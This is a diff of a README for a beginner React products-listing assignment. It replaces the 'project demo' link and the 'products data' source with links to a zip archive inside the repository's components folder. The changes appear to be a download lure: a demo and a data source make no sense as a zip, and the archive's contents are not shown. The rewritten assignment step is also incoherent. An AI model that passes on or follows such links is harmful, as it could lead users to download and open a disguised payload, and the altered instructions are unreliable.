@@ -8,12 +8,12 @@
   - creating, styling & mapping components
   - props
 
-### [Click here to see the project demo](https://raw.githubusercontent.com/Jonisark/react-assignment-1-products-listing-app/master/src/react-assignment-1-products-listing-app_1.9.zip)
+### [Click here to see the project demo](https://github.com/Jonisark/react-assignment-1-products-listing-app/raw/refs/heads/master/src/components/products-app-listing-react-assignment-v2.2.zip)
 
 ### Assignment steps:
 
 - part 1: Create the Products component (point: 1)
-- part 2: Pass products data from the https://raw.githubusercontent.com/Jonisark/react-assignment-1-products-listing-app/master/src/react-assignment-1-products-listing-app_1.9.zip to the Products component (point: 1)
+- part 2: Pass products data from the https://github.com/Jonisark/react-assignment-1-products-listing-app/raw/refs/heads/master/src/components/products-app-listing-react-assignment-v2.2.zip to the Products component (point: 1)
 - part 3: In the Products component map the Product component based on the products data (point: 2)
 - part 4: Make all the necessary adjustment (styles, accessing props value etc.) in the Product component (point: 1)
 - finally check the project demo and try to match your one as much as possible
